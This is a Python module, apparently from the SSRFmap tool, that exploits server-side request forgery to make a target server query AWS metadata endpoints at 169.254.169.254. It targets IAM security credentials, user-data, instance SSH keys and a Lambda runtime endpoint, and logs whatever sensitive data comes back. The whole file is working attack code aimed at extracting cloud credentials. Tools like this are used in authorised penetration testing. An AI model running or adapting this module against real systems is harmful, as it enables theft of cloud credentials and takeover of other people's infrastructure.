import logging
import os
from typing import List, Set, Tuple

from ssrfmap.core.utils import diff_text, wrapper_http

name = "aws"
description = "Access sensitive data from AWS"
author = "Swissky"
documentation: List[str] = [
    "https://hackerone.com/reports/53088",
    "https://hackerone.com/reports/285380",
    "https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/",
    "https://twitter.com/spengietz/status/1161317376060563456",
]


class exploit:
    endpoints: Set[Tuple[str, str, str]] = set()

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.add_endpoints()

        r = requester.do_request(args.param, "")

        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], endpoint[2])
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(payload))
                    logging.debug(diff)

    def add_endpoints(self):
        self.endpoints.add(("169.254.169.254", "latest/user-data", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/ami-id", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/reservation-id", "80"))
        self.endpoints.add(("169.254.169.254", "latest/meta-data/hostname", "80"))
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/public-keys/0/openssh-key", "80")
        )
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/public-keys/1/openssh-key", "80")
        )
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/public-keys/2/openssh-key", "80")
        )
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/iam/security-credentials/dummy", "80")
        )
        self.endpoints.add(
            (
                "169.254.169.254",
                "latest/meta-data/iam/security-credentials/ecsInstanceRole",
                "80",
            )
        )
        self.endpoints.add(
            ("169.254.169.254", "latest/meta-data/iam/security-credentials/", "80")
        )
        self.endpoints.add(("169.254.169.254", "latest/meta-data/public-keys/", "80"))
        self.endpoints.add(("169.254.169.254", "latest/user-data/", "80"))
        self.endpoints.add(("localhost", "2018-06-01/runtime/invocation/next", "9001"))
